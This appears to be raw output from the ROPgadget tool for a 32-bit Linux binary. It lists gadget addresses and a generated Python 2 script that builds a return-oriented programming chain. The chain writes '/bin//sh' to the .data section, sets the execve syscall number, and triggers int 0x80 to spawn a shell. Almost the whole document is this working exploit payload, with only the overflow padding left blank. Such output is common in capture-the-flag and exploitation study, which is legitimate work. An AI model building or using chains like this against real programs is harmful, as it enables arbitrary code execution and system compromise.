Unique gadgets found: 12030

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x8055862 mov dword ptr [edx], ecx ; ret
	[+] Gadget found: 0x80701aa pop edx ; ret
	[+] Gadget found: 0x80701d1 pop ecx ; pop ebx ; ret
	[-] Can't find the 'xor ecx, ecx' gadget. Try with another 'mov [r], r'

	[+] Gadget found: 0x809b30d mov dword ptr [edx], eax ; ret
	[+] Gadget found: 0x80701aa pop edx ; ret
	[+] Gadget found: 0x805c34b pop eax ; ret
	[+] Gadget found: 0x80550d0 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x80550d0 xor eax, eax ; ret
	[+] Gadget found: 0x807cb7f inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x80481d1 pop ebx ; ret
	[+] Gadget found: 0x80701d1 pop ecx ; pop ebx ; ret
	[+] Gadget found: 0x80701aa pop edx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x8049a21 int 0x80

- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec060) # @ .data
	p += pack('<I', 0x0805c34b) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec064) # @ .data + 4
	p += pack('<I', 0x0805c34b) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec068) # @ .data + 8
	p += pack('<I', 0x080550d0) # xor eax, eax ; ret
	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481d1) # pop ebx ; ret
	p += pack('<I', 0x080ec060) # @ .data
	p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080ec068) # @ .data + 8
	p += pack('<I', 0x080ec060) # padding without overwrite ebx
	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec068) # @ .data + 8
	p += pack('<I', 0x080550d0) # xor eax, eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x08049a21) # int 0x80
